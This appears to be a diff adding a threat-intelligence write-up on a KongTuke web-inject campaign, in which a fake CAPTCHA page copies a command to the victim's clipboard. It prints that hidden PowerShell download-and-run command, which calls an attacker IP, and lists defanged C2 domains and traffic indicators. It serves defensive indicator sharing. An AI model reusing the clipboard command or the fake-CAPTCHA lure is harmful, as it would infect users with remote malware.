@@ -1,0 +1,50 @@
+2025-04-04 (FRIDAY): KONGTUKE WEB INJECT FOR FAKE CAPTCHA PAGE
+
+AUTHOR:
+
+- Bradley Duncan
+
+NOTES:
+
+- This attack chain starts with injected script into legitimate but compromised websites.
+- The injected script leads to a fake "verify you are human" (aka CAPTHCA) page.
+- The fake CAPTCHA page injects script into a potential victim's clipboard.
+- This process is sometimes referred to as "clipboard hijacking" or "pastejacking."
+- The fake CAPTCH page contains instructions 
+- This activity is tracked as #KongTuke by sources like @monitorsg on Mastodon and Threatfox:
+  -- https://infosec.exchange/@monitorsg
+  -- https://threatfox.abuse.ch/browse/tag/Kongtuke
+- Post-infection traffic is similar to what we've seen before from Async RAT.
+- However, the final malware remains unidentified, and we currently have no sample for it.
+
+KONGTUKE TRAFFIC FOR FAKE CAPTCHA PAGE:
+
+- hxxps[:]//lancasternh[.]com/6t7y.js
+- hxxps[:]//lancasternh[.]com/js.php?device=windows&ip=[base64 text]&refferer=[base64 text]&
+  browser=[base64 text]&ua=[base64 text]&domain=[base64 text]&loc=[base64 text]&is_ajax=1
+
+SCRIPT INJECTED INTO CLIPBOARD BY FAKE CAPTCHA PAGE:
+
+- powershell -w h -c "iex $(irm 138.199.156[.]22:8080/$($z = [datetime]::UtcNow;
+  $y = ([datetime]('01/01/' + '1970')); $x = ($z - $y).TotalSeconds; 
+  $w = [math]::Floor($x); $v = $w - ($w % 16); [int64]$v))"
+
+TRAFFIC FROM PASTED SCRITP:
+
+- 138.199.156[.]22:8080 - 138.199.156[.]22:8080 - GET /1743783280
+- 138.199.156[.]22:8080 - 138.199.156[.]22:8080 - POST /1743783296
+- 185.250.151[.]155:80 - ecduutcykpvkbim[.]top - GET /1.php?s=527
+- 185.250.151[.]155:80 - bfidmcjejlilflg[.]top - GET /z8v7ymbcinhtr.php?id=[hostname]C&key=[11-digit number]&s=527
+
+POST-INFECTION C2 TRAFFIC:
+
+- 173.232.146[.]62:25658 - 8qvihxy8x5nyixj[.]top - TLSv1.0 HTTPS traffic
+
+IP ADDRESS CHECK BY INFECTED WINDOWS HOST:
+
+- api.ipify[.]org
+- ipinfo[.]io/[victim's IP address]/city
+- ipinfo[.]io/[victim's IP address]/region
+- ipinfo[.]io/[victim's IP address]/country
+
+- Note: the IP address check is not inherently malicious.
